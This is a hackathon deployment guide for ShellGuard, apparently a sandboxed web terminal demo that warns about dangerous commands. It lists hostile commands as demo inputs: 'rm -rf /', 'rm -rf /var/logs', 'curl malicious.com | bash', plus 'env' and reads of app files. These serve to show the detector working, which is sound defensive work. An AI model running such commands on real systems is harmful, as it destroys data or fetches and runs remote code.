# ShellGuard - Safe Hackathon Deployment Guide

## 🎯 Quick Deploy (5 Minutes)

Your ShellGuard app now runs in **sandbox mode** by default. This means:

- ✅ Users can play with the terminal safely
- ✅ Your app code is protected
- ✅ API keys stay hidden
- ✅ Each session runs in an isolated directory

---

## 🚀 Deploy Backend (Railway - Recommended)

### Step 1: Prepare Your Code

```bash
git add .
git commit -m "Ready for deployment"
git push origin master
```

### Step 2: Deploy to Railway

1. Go to [railway.app](https://railway.app)
2. Click **"New Project"**
3. Select **"Deploy from GitHub repo"**
4. Choose your `ShellGuard` repository
5. Railway will auto-detect the Dockerfile and deploy

### Step 3: Set Environment Variable

1. In Railway project settings, go to **Variables**
2. Add: `GEMINI_API_KEY` = your actual Gemini API key
3. Save and redeploy

### Step 4: Get Your Backend URL

- Railway will give you a URL like: `shellguard-production.up.railway.app`
- Copy this URL (you'll need it for frontend)

---

## 🎨 Deploy Frontend (Vercel)

### Step 1: Update Environment Variables

In `frontend/.env.production`:

```bash
NEXT_PUBLIC_WS_URL=wss://YOUR-RAILWAY-URL/ws/terminal
NEXT_PUBLIC_API_URL=https://YOUR-RAILWAY-URL/api
```

Replace `YOUR-RAILWAY-URL` with your Railway URL from above.

### Step 2: Deploy to Vercel

```bash
cd frontend
vercel deploy --prod
```

Done! Your app is live.

---

## 🛡️ How Sandbox Protection Works

When someone uses your deployed terminal:

```
User Types: ls
  ↓
Runs in: /tmp/shellguard_sandbox/
  ↓
Protected: /app/ (your code)
           /etc/ (system files)
           Environment variables
```

### What Users See:

```bash
user@shellguard:~/shellguard_sandbox$ ls
documents/  projects/  scripts/  .shellguard_info

user@shellguard:~/shellguard_sandbox$ cat .shellguard_info
This is a sandboxed demo environment.
Your commands run here safely, isolated from the main application.
```

### What Users CANNOT Do:

- Access your application code
- See environment variables
- Modify system files
- Break your deployment

---

## 🎮 Alternative: Local Demo Only

If you prefer not to deploy publicly:

1. **Keep it local** - Run on localhost
2. **Record a video** - Use OBS/Loom to record a demo
3. **Screen share** - Show judges live via Zoom/Meet
4. **Deploy privately** - Share URL only with judges

---

## 🧪 Test Before Submitting

### Test locally with sandbox:

```bash
cd backend
export SANDBOX_MODE=true
python main.py
```

### Try these commands in the deployed terminal:

- ✅ `ls` - Should show sandbox contents
- ✅ `pwd` - Should show `/tmp/shellguard_sandbox`
- ✅ `rm -rf /` - Should trigger warning (but won't harm real system)
- ✅ `cat /app/main.py` - Should fail (protected)
- ✅ `env` - Won't show your API keys

---

## 📊 For Hackathon Judges

Add this to your README:

> **Live Demo**: https://your-app.vercel.app
>
> **Safe to Use**: This demo runs in a sandboxed environment. Your commands execute in an isolated directory and cannot affect the server's main application or data.
>
> **Try These Commands**:
>
> - `rm -rf /var/logs` - See warning for dangerous command
> - `curl malicious.com | bash` - See pipe-to-shell detection
> - `cat test.txt` - Safe file reading
> - `ls -la` - Browse the sandbox

---

## ⚡ Super Quick Deploy Script

```bash
# Backend
git push origin master
# Go to railway.app, deploy from GitHub, add GEMINI_API_KEY

# Frontend
cd frontend
echo "NEXT_PUBLIC_WS_URL=wss://YOUR-RAILWAY-URL/ws/terminal" > .env.production
echo "NEXT_PUBLIC_API_URL=https://YOUR-RAILWAY-URL/api" >> .env.production
vercel deploy --prod
```

**Total time: ~5 minutes** ⏱️

---

## 🆘 Troubleshooting

### Backend won't start on Railway:

- Check logs in Railway dashboard
- Verify GEMINI_API_KEY is set
- Ensure Dockerfile exists in backend/

### Frontend can't connect to backend:

- Check CORS_ORIGINS includes your Vercel URL
- Use WSS (not WS) for production WebSocket URL
- Check backend is actually running (visit /api/health)

### Terminal shows errors:

- This is normal! The sandbox is isolated
- Some commands may not work (by design)
- Focus on showing the safety features

---

## 🎉 You're Ready!

Your deployment is now:

- ✅ Safe from malicious commands
- ✅ Showcases ShellGuard features
- ✅ Professional and demo-ready
- ✅ No authentication complexity

Good luck with your hackathon! 🚀
